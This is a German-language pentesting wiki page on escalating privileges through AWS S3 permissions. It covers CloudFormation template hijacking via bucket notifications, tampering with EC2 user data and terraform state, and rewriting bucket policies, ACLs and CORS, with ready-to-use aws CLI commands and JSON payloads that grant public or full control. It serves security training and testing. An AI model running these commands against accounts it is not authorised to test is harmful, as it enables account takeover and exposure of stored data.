# AWS - S3 Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## S3

### `s3:PutBucketNotification`, `s3:PutObject`, `s3:GetObject`

Ein Angreifer mit diesen Berechtigungen für interessante Buckets könnte Ressourcen kapern und Privilegien eskalieren.

Zum Beispiel kann ein Angreifer mit diesen **Berechtigungen für einen cloudformation-Bucket** namens "cf-templates-nohnwfax6a6i-us-east-1" die Deployment kapern. Der Zugriff kann mit folgender Richtlinie gewährt werden:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"s3:PutBucketNotification",
"s3:GetBucketNotification",
"s3:PutObject",
"s3:GetObject"
],
"Resource": [
"arn:aws:s3:::cf-templates-*/*",
"arn:aws:s3:::cf-templates-*"
]
},
{
"Effect": "Allow",
"Action": "s3:ListAllMyBuckets",
"Resource": "*"
}
]
}
```
Und der hijack ist möglich, weil es ein **kleines Zeitfenster vom Moment, in dem die template in den bucket hochgeladen wird, bis zu dem Moment, in dem die template deployed wird** gibt. Ein Angreifer könnte einfach eine **lambda function** in seinem Konto erstellen, die **triggered, wenn eine bucket notification gesendet wird**, und den **content** dieses **bucket** hijacks.

![](<../../../images/image (174).png>)

Das Pacu-Modul [`cfn__resouce_injection`](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#cfn__resource_injection) kann verwendet werden, um diesen Angriff zu automatisieren.\
Für mehr Informationen siehe die Original-Analyse: [https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/](https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/)

### `s3:PutObject`, `s3:GetObject` <a href="#s3putobject-s3getobject" id="s3putobject-s3getobject"></a>

Dies sind die Berechtigungen, um **Objekte in S3 zu lesen und hochzuladen**. Mehrere Services innerhalb von AWS (und außerhalb) nutzen S3-Speicher, um **config files** abzulegen.\
Ein Angreifer mit **read access** darauf könnte **sensitive information** darin finden.\
Ein Angreifer mit **write access** könnte **die Daten manipulieren, um einen Dienst zu missbrauchen und versuchen, privileges zu escalaten**.\
Hier einige Beispiele:

- Wenn eine EC2-Instanz die **user data in einem S3 bucket** speichert, könnte ein Angreifer diese ändern, um **arbitrary code innerhalb der EC2-Instanz auszuführen**.

### `s3:PutObject`, `s3:GetObject` (optional) over terraform state file

Es ist sehr verbreitet, dass die [terraform](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/terraform-security.html) state files im Blob-Storage von Cloud-Anbietern, z. B. AWS S3, gespeichert werden. Die Dateiendung für eine state file ist `.tfstate`, und die Bucket-Namen verraten oft, dass sie terraform state files enthalten. Üblicherweise hat jedes AWS-Konto einen solchen Bucket, um die state files zu speichern, die den Zustand des Kontos anzeigen. Außerdem haben in realen Konten fast immer alle Entwickler `s3:*` und manchmal sogar Business-User `s3:Put*`.

Wenn du also die oben genannten Berechtigungen für diese Dateien hast, gibt es einen Angriffsvektor, mit dem du RCE in der Pipeline mit den Rechten von `terraform` erlangen kannst — meist `AdministratorAccess`, wodurch du zum Administrator des Cloud-Kontos wirst. Außerdem kannst du diesen Vektor nutzen, um einen Denial-of-Service-Angriff durchzuführen, indem du `terraform` dazu bringst, legitime Ressourcen zu löschen.

Folge der Beschreibung im Abschnitt *Abusing Terraform State Files* der Seite *Terraform Security* für direkt nutzbaren Exploit-Code:

{{#ref}}
../../../../pentesting-ci-cd/terraform-security.md#abusing-terraform-state-files
{{#endref}}

### `s3:PutBucketPolicy`

Ein Angreifer, der **aus demselben account** stammen muss — andernfalls tritt der Fehler `The specified method is not allowed` auf — kann sich mit dieser Berechtigung selbst weitere Rechte auf den Bucket(s) gewähren, die es ihm erlauben, Buckets zu lesen, zu schreiben, zu ändern, zu löschen und offenzulegen.
```bash
# Update Bucket policy
aws s3api put-bucket-policy --policy file:///root/policy.json --bucket <bucket-name>

## JSON giving permissions to a user and mantaining some previous root access
{
"Id": "Policy1568185116930",
"Version":"2012-10-17",
"Statement":[
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:root"
},
"Action":"s3:ListBucket",
"Resource":"arn:aws:s3:::somebucketname"
},
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:user/username"
},
"Action":"s3:*",
"Resource":"arn:aws:s3:::somebucketname/*"
}
]
}

## JSON Public policy example
### IF THE S3 BUCKET IS PROTECTED FROM BEING PUBLICLY EXPOSED, THIS WILL THROW AN ACCESS DENIED EVEN IF YOU HAVE ENOUGH PERMISSIONS
{
"Id": "Policy1568185116930",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Stmt1568184932403",
"Action": [
"s3:ListBucket"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome",
"Principal": "*"
},
{
"Sid": "Stmt1568185007451",
"Action": [
"s3:GetObject"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome/*",
"Principal": "*"
}
]
}
```
### `s3:GetBucketAcl`, `s3:PutBucketAcl`

Ein attacker könnte diese Berechtigungen missbrauchen, um **grant him more access** für bestimmte buckets zu erhalten.\
Beachte, dass der attacker nicht aus demselben account stammen muss. Außerdem ermöglicht der write access
```bash
# Update bucket ACL
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api put-bucket-acl --bucket <bucket-name> --access-control-policy file://acl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectAcl`

Ein Angreifer könnte diese Berechtigungen missbrauchen, um sich mehr Zugriff auf bestimmte Objekte in Buckets zu verschaffen.
```bash
# Update bucket object ACL
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --access-control-policy file://objacl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectVersionAcl`

Ein Angreifer mit diesen Berechtigungen sollte in der Lage sein, eine Acl auf eine bestimmte Objektversion zu setzen.
```bash
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --version-id <value> --access-control-policy file://objacl.json
```
### `s3:PutBucketCORS`

Ein Angreifer mit der Berechtigung s3:PutBucketCORS kann die CORS (Cross-Origin Resource Sharing)-Konfiguration eines Buckets ändern, die steuert, welche Webdomains auf dessen Endpunkte zugreifen dürfen. Setzt er eine zu großzügige Richtlinie, könnte jede Website direkte Anfragen an den Bucket senden und Antworten im Browser auslesen.

Das bedeutet, dass ein authentifizierter Benutzer einer vom Bucket gehosteten Webanwendung, wenn er die Website des Angreifers besucht, potenziell ausgenutzt werden kann: Der Angreifer könnte die permissive CORS-Richtlinie ausnutzen und je nach Anwendung auf Profildaten des Benutzers zugreifen oder sogar das Benutzerkonto übernehmen.
```bash
aws s3api put-bucket-cors \
--bucket <BUCKET_NAME> \
--cors-configuration '{
"CORSRules": [
{
"AllowedOrigins": ["*"],
"AllowedMethods": ["GET", "PUT", "POST"],
"AllowedHeaders": ["*"],
"ExposeHeaders": ["x-amz-request-id"],
"MaxAgeSeconds": 3000
}
]
}'
```
{{#include ../../../../banners/hacktricks-training.md}}
